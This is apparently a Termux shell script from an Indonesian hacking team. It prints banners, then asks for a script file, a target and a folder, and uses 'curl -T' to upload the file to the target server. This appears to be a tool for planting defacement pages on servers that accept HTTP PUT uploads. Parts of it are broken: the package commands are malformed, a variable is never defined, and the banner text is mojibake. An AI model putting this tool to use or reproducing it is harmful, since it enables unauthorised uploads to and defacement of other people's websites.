##XERXEZ7
##TOOLA SIMPLE OKE
pkg install curl
pkg update install
pkg install update && install upgrade
clear
figlet -f slant InYourXerXez | lolcat
echo "â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡"|lolcat
echo "â–¡ AUTHOR : INYOUR XERXEZ7      â–¡"|lolcat
echo "â–¡ TEAM   : 2E4H~LIT~DFA~GBLK   â–¡"|lolcat
echo "â–¡ SINCE  : 2K19-2K20           â–¡"|lolcat
echo "â–¡ CONAK  : +62 8588-xxxx-741   â–¡"|lolcat
echo "â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡"|lolcat
date | lolcat | screenfetch -A Fux
echo ""
figlet -f slant { Y / N } | lolcat
echo ""
echo -e "â•­â”€[SILAHKAN PILIH Y/N]" | lolcat
read -p "â•°â”€$ " pil;

if [ $pil = Y ] || [ $pil = y ]
then
echo "â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡"
sh live.sh
echo "â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡"
echo -e "â•­â”€[MASUKAN SC ANDA]" | lolcat
read -p "â•°â”€$ " sc;
echo -e "â•­â”€[MASUKAN TARGET ]" | lolcat
read -p "â•°â”€$ " tgt;
echo -e "â•­â”€[DIRECTORI PENYIMPANAN KAMu ]" | lolcat
read -p "â•°â”€$ " s;
sleep 2
curl -T /sdcard/$sc $tgt
curl -T /storage/emulated/0/$sc $tgt
curl -T $s/$sv $tgt
sleep 3
clear
echo "{ CEK DI $tgt/$sc }"|lolcat
fi


if [ $pil = N ] || [ $pil = n ]
then
figlet -f big 2e4hTeam|lolcat
sleep 5
exit
fi
